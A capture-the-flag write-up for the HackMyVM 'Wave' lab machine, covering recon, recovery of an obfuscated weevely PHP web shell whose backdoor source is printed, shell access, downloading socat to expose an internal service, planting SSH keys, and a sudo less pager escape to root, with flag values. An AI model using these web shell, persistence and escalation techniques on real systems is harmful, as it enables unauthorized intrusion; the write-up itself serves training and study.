# Wave

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.145:22
Open 10.0.2.145:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.145
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 07:e9:c8:22:59:a5:00:41:15:fa:26:0f:7d:d3:29:ff (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKe0UpYSdrYZSfz8wEnzmtB6rYS+QxwxRUwAGzpy57vqkqNrVAHXyNTbkqD8a+OQMTBeCqlLnlhIFtw74VaGP7Y=
|   256 c7:81:8e:06:49:33:8f:1a:88:3b:82:9e:27:f3:72:1e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF6i9HqL7v6nqbyYKQLfWZoPI7oyUyoBwBNhumUpRpWJ
80/tcp open  http    syn-ack nginx 1.22.1
| http-robots.txt: 1 disallowed entry 
|_/backup
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ curl 10.0.2.145
<h1> WAVE </h1>

<!-- wAvE -->
```

```bash
└─$ curl 10.0.2.145/backup/
<html>
<head><title>Index of /backup/</title></head>
<body>
<h1>Index of /backup/</h1><hr><pre><a href="../">../</a>
<a href="index.bck">index.bck</a>                                          04-Sep-2023 10:10                  31
<a href="log.log">log.log</a>                                            04-Sep-2023 10:12                   4
<a href="phptest.bck">phptest.bck</a>                                        04-Sep-2023 10:11                  32
<a href="robots.bck">robots.bck</a>                                         04-Sep-2023 10:10                  18
<a href="weevely.bck">weevely.bck</a>                                        05-Sep-2023 09:20                 515
</pre><hr></body>
</html>
```

Backup files shows existing files on `/`, but `weevely.php` doesn't seem to be there.
```bash
└─$ curl 10.0.2.145/phptest.bck
<head><title>404 Not Found</title></head>

└─$ curl 10.0.2.145/phptest.php
HELLO WORLD                                                                                              

└─$ curl 10.0.2.145/weevely.bck
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your
Warning: terminal anyway, or consider "--output <FILE>" to save to a file.

└─$ curl 10.0.2.145/weevely.php
<head><title>404 Not Found</title></head>
```

### Weevely

- **[weevely3](https://github.com/epinna/weevely3)**: Weaponized web shell
- [Hunting and Dissecting the Weevely Web Shell - Threat Hunting Summit 2016](https://www.youtube.com/watch?v=VpTb-BPdKyY)

Find the webshell
```bash
└─$ ffuf -u 'http://10.0.2.145/weevely.FUZZ' -w /usr/share/seclists/Fuzzing/extensions-most-common.fuzz.txt
# Nothing
└─$ ffuf -u 'http://10.0.2.145/weevelyFUZZ' -w <(curl https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst -s)
.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
```

Let's dissect the backup. Both `bck` files are same.
```bash
└─$ curl 10.0.2.145/weevely.bck -so weevely.bck.1
└─$ curl 10.0.2.145/backup/weevely.bck -so weevely.bck.2
└─$ md5sum weevely.bck.*
207d368fa961040ff2593460a17ca4a3  weevely.bck.1
207d368fa961040ff2593460a17ca4a3  weevely.bck.2
```

```bash
└─$ file weevely.bck
weevely.bck: PHP phar archive with SHA1 signature
└─$ phar extract -f weevely.bck
```

```php
└─$ cat x
<?php eval('
$k="3ddf0d5c";
$kh="b6e7a529b6c2";
$kf="d598a771749b";
$p="afnqDsRcBpVmU71y";

function x($t,$k){qqq
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;) {
		for($j=0;($j<$c&&$i<$l);$j++,$i++) {
			$o.=$t[$i]^$k[$j];
		}
	}
	return $o;
}
if (@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print("$p$kh$r$kf");
}'); 
```

The source code shows how password is managed
- [src/weevely/bd/agents/obfpost_php.tpl](https://github.com/epinna/weevely3/blob/master/src/weevely/bd/agents/obfpost_php.tpl)

Lucky for us the password was very simple

![writeup.png](/assets/pentest/hackmyvm/wave/writeup.png)

> **Note**: You can do this without password, but you have to write a script which delivers correct payload to webshell.

## Lateral Movement (www-data)

```bash
└─$ weevely http://10.0.2.145/weevely.php7 aaazz
weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

2 users
```bash
www-data@wave:/home $ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
angie:x:1000:1000:angie,,,:/home/angie:/bin/bash
carla:x:1001:1001:,,,:/home/carla:/bin/bash
```

There's another http server running internally
```bash
www-data@wave:/home $ ss -tunlp4
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*
tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=477,fd=5))
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
```

Use `socat` to expose  the port
```bash
www-data@wave:/tmp $ wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/socat -q
www-data@wave:/tmp $ chmod +x socat
socat TCP-LISTEN:9000,bind=0.0.0.0,reuseaddr,fork TCP:127.0.0.1:3306
```

![writeup-1.png](/assets/pentest/hackmyvm/wave/writeup-1.png)

This seems like a home directory for a user, upload SSH keys?
```bash
└─$ ssh-keygen -f id_rsa -P x -q
└─$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMdXG9r3DW1x48FA+0fWZBMAcSveQ3UEA71+ioMu9Mc/ woyag@kraken
└─$ mv id_rsa.pub authorized_keys
```

Use `Folder` icon to create `.ssh` directory and upload `authorized_keys`

## SSH (angie)

```bash
└─$ ssh -i id_rsa angie@10.0.2.145
angie@wave:~$ id
uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```bash
angie@wave:~$ cat user.txt
HMVIdsEwudDxJDSaue32DJa
```

## Privilege Escalation (root)

```bash
angie@wave:~$ sudo -l
Matching Defaults entries for angie on wave:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angie may run the following commands on wave:
    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
```

You can manually minimize your terminal so only 1 line is readable and get pager
```bash
angie@wave:~$ man less
	-F or --quit-if-one-screen
		  Causes less to automatically exit if the entire file can be displayed on the first screen.
```

Or you can set `tty` to show only 2 rows (doesn't require minimizing terminal).
```bash
angie@wave:~$ stty rows 2 cols 100
angie@wave:~$ sudo less -F /opt/secret.txt
# Type: !/bin/bash
root@wave:/home/angie# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@wave:~# cat root.txt
HMVNVJrewoiu47rewFDSR
```